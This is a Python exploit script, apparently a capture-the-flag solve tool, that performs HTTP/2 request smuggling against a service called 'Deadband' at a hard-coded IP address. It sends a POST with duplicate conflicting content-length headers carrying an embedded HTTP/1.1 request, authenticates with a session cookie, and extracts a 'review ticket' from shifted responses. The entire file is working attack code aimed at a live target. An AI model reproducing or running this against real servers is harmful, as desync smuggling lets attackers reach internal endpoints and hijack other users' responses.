#!/usr/bin/env python3
"""One-exchange Deadband H2 ordered-collector primitive.

The tool deliberately opens exactly one H2 request stream per TCP connection.
It can send either:

* ``plain``: a normal POST /ingest/ping with body ``{}``, used to advance an
  already shifted operator response queue by exactly one item; or
* ``carrier``: the ordered duplicate-Content-Length carrier with one embedded
  HTTP/1.1 GET or POST.

It is target-locked to the original Deadband instance.  Cookie contents are
read from a Netscape jar and are never included in output.
"""

from __future__ import annotations

import argparse
import json
import re
import socket
import time
from pathlib import Path
from typing import Any

from h2.config import H2Configuration
from h2.connection import H2Connection
from h2.events import RemoteSettingsChanged
from hpack import Decoder


TARGET_HOST = "15.165.43.118"
TARGET_PORT = 8080


def load_cookie(path: Path, name: str = "deadband_session") -> str:
    for raw_line in path.read_text(encoding="utf-8").splitlines():
        if name not in raw_line:
            continue
        fields = raw_line.split("\t")
        if len(fields) >= 7 and fields[-2] == name:
            return f"{fields[-2]}={fields[-1]}"
    raise ValueError(f"cookie {name!r} not found")


def frame_bytes(frame_type: int, flags: int, stream_id: int, payload: bytes = b"") -> bytes:
    return (
        len(payload).to_bytes(3, "big")
        + bytes([frame_type, flags])
        + (stream_id & 0x7FFFFFFF).to_bytes(4, "big")
        + payload
    )


def header_fragment(payload: bytes, flags: int) -> bytes:
    start = 0
    end = len(payload)
    if flags & 0x08:
        padding = payload[0]
        start += 1
        end -= padding
    if flags & 0x20:
        start += 5
    return payload[start:end]


def decode_headers(decoder: Decoder, block: bytes) -> list[list[str]]:
    result = []
    for key, value in decoder.decode(block, raw=False):
        if isinstance(key, bytes):
            key = key.decode("utf-8", "replace")
        if isinstance(value, bytes):
            value = value.decode("utf-8", "replace")
        result.append([str(key), str(value)])
    return result


def header_value(headers: list[list[str]], name: str) -> str | None:
    wanted = name.lower()
    for key, value in headers:
        if key.lower() == wanted:
            return value
    return None


def build_inner(method: str, path: str, body: bytes, host: str = "ingest") -> bytes:
    if not re.fullmatch(r"[A-Za-z0-9._:-]+", host):
        raise ValueError("invalid inner Host")
    if method == "GET":
        if body:
            raise ValueError("GET inner request cannot have a body")
        return (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Accept: */*\r\n"
            "Connection: keep-alive\r\n\r\n"
        ).encode("ascii")
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: keep-alive\r\n\r\n"
    ).encode("ascii") + body


def run_exchange(
    mode: str,
    cookie_jar: Path,
    timeout: float,
    inner_method: str | None = None,
    inner_path: str | None = None,
    inner_body: bytes = b"",
    inner_host: str = "ingest",
) -> dict[str, Any]:
    config = H2Configuration(
        client_side=True,
        header_encoding="utf-8",
        validate_outbound_headers=False,
        normalize_outbound_headers=False,
        validate_inbound_headers=False,
        normalize_inbound_headers=False,
    )
    conn = H2Connection(config=config)
    sock = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=timeout)
    sock.settimeout(0.5)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    deadline = time.monotonic() + timeout
    settings_seen = False
    while time.monotonic() < deadline and not settings_seen:
        try:
            packet = sock.recv(65535)
        except socket.timeout:
            continue
        if not packet:
            raise ConnectionError("connection closed during H2 handshake")
        events = conn.receive_data(packet)
        settings_seen = any(isinstance(event, RemoteSettingsChanged) for event in events)
        pending = conn.data_to_send()
        if pending:
            sock.sendall(pending)
    if not settings_seen:
        raise TimeoutError("server SETTINGS not received")

    common = [
        (":method", "POST"),
        (":path", "/ingest/ping"),
        (":scheme", "http"),
        (":authority", f"{TARGET_HOST}:{TARGET_PORT}"),
        ("cookie", load_cookie(cookie_jar)),
        ("content-type", "application/json"),
    ]

    if mode == "plain":
        outer_body = b"{}"
        lengths = [("content-length", "2")]
        carrier_bytes = None
    else:
        assert inner_method and inner_path
        outer_body = b"{}" + build_inner(inner_method, inner_path, inner_body, inner_host)
        lengths = [
            ("content-length", str(len(outer_body))),
            ("content-length", "2"),
        ]
        carrier_bytes = len(outer_body)

    conn.send_headers(1, common + lengths, end_stream=False)
    conn.send_data(1, outer_body, end_stream=True)
    sock.sendall(conn.data_to_send())

    result: dict[str, Any] = {
        "target": f"http://{TARGET_HOST}:{TARGET_PORT}",
        "mode": mode,
        "outer_path": "/ingest/ping",
        "outer_body_bytes": len(outer_body),
        "events": [],
        "frames": [],
        "body": "",
    }
    if carrier_bytes is not None:
        result.update(
            {
                "carrier_bytes": carrier_bytes,
                "inner_method": inner_method,
                "inner_path": inner_path,
                "inner_host": inner_host,
                "inner_body_bytes": len(inner_body),
            }
        )

    wire = bytearray()
    body = bytearray()
    decoder = Decoder()
    header_blocks: dict[int, bytearray] = {}
    header_end_stream: dict[int, bool] = {}
    ended = False

    def finish_headers(stream_id: int) -> None:
        nonlocal ended
        block = bytes(header_blocks.pop(stream_id, b""))
        headers = decode_headers(decoder, block)
        status = header_value(headers, ":status")
        kind = "informational" if status and status.startswith("1") else "response"
        if not status:
            kind = "trailers"
        result["events"].append({"type": kind, "headers": headers})
        if header_end_stream.pop(stream_id, False):
            result["events"].append({"type": "end"})
            ended = True

    try:
        while time.monotonic() < deadline and not ended:
            try:
                packet = sock.recv(65535)
            except socket.timeout:
                continue
            except ConnectionResetError as error:
                result["connection_reset"] = str(error)
                break
            if not packet:
                break
            wire.extend(packet)
            while len(wire) >= 9:
                length = int.from_bytes(wire[0:3], "big")
                if len(wire) < 9 + length:
                    break
                frame_type = wire[3]
                flags = wire[4]
                stream_id = int.from_bytes(wire[5:9], "big") & 0x7FFFFFFF
                payload = bytes(wire[9 : 9 + length])
                del wire[: 9 + length]
                result["frames"].append(
                    {
                        "type": frame_type,
                        "flags": flags,
                        "stream_id": stream_id,
                        "length": length,
                    }
                )
                if frame_type == 4 and not (flags & 0x01):
                    sock.sendall(frame_bytes(4, 0x01, 0))
                elif frame_type == 6 and not (flags & 0x01):
                    sock.sendall(frame_bytes(6, 0x01, 0, payload))
                elif frame_type == 1:
                    header_blocks[stream_id] = bytearray(header_fragment(payload, flags))
                    header_end_stream[stream_id] = bool(flags & 0x01)
                    if flags & 0x04:
                        finish_headers(stream_id)
                elif frame_type == 9:
                    header_blocks.setdefault(stream_id, bytearray()).extend(payload)
                    if flags & 0x04:
                        finish_headers(stream_id)
                elif frame_type == 0 and stream_id == 1:
                    body.extend(header_fragment(payload, flags & 0x08))
                    if flags & 0x01:
                        result["events"].append({"type": "end"})
                        ended = True
                elif frame_type == 3 and stream_id == 1:
                    code = int.from_bytes(payload[:4], "big") if len(payload) >= 4 else -1
                    result["events"].append({"type": "reset", "error_code": code})
                    ended = True
    finally:
        sock.close()

    result["body"] = bytes(body).decode("utf-8", "replace")

    prefix = None
    for event in result["events"]:
        link = header_value(event.get("headers", []), "link")
        if link:
            match = re.search(r"/review-ticket/([0-9a-f]{24})", link, re.I)
            if match:
                prefix = match.group(1).lower()
                break
    suffix_match = re.search(
        r"(?im)^X-Review-Ticket-Suffix:\s*([0-9a-f]{24})\s*$",
        result["body"],
    )
    suffix = suffix_match.group(1).lower() if suffix_match else None
    if prefix:
        result["ticket_prefix"] = prefix
    if suffix:
        result["ticket_suffix"] = suffix
    if prefix and suffix:
        result["review_ticket"] = prefix + suffix
    status_line = re.search(r"(?m)^HTTP/1\.1 ([0-9]{3}) ([^\r\n]+)", result["body"])
    if status_line:
        result["embedded_http_status"] = int(status_line.group(1))
        result["embedded_http_reason"] = status_line.group(2)
    return result


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("mode", choices=("plain", "carrier"))
    parser.add_argument("--cookie-jar", type=Path, required=True)
    parser.add_argument("--timeout", type=float, default=15.0)
    parser.add_argument("--inner-method", choices=("GET", "POST"))
    parser.add_argument("--inner-path")
    parser.add_argument("--inner-host", default="ingest")
    body = parser.add_mutually_exclusive_group()
    body.add_argument("--inner-body-json")
    body.add_argument("--inner-body-file", type=Path)
    parser.add_argument("--output", type=Path)
    args = parser.parse_args()

    inner_body = b""
    if args.inner_body_file:
        inner_body = args.inner_body_file.read_bytes()
        json.loads(inner_body)
    elif args.inner_body_json is not None:
        parsed = json.loads(args.inner_body_json)
        inner_body = json.dumps(
            parsed, separators=(",", ":"), ensure_ascii=False
        ).encode("utf-8")

    if args.mode == "carrier":
        if not args.inner_method or not args.inner_path:
            parser.error("carrier requires --inner-method and --inner-path")
        if args.inner_method == "POST" and not inner_body:
            parser.error("POST carrier requires a JSON body")
        if args.inner_method == "GET" and inner_body:
            parser.error("GET carrier must not include a body")
    elif args.inner_method or args.inner_path or inner_body:
        parser.error("plain mode does not accept inner request options")

    result = run_exchange(
        args.mode,
        args.cookie_jar,
        args.timeout,
        args.inner_method,
        args.inner_path,
        inner_body,
        args.inner_host,
    )
    rendered = json.dumps(result, ensure_ascii=False, indent=2)
    print(rendered)
    if args.output:
        args.output.write_text(rendered + "\n", encoding="utf-8")


if __name__ == "__main__":
    main()
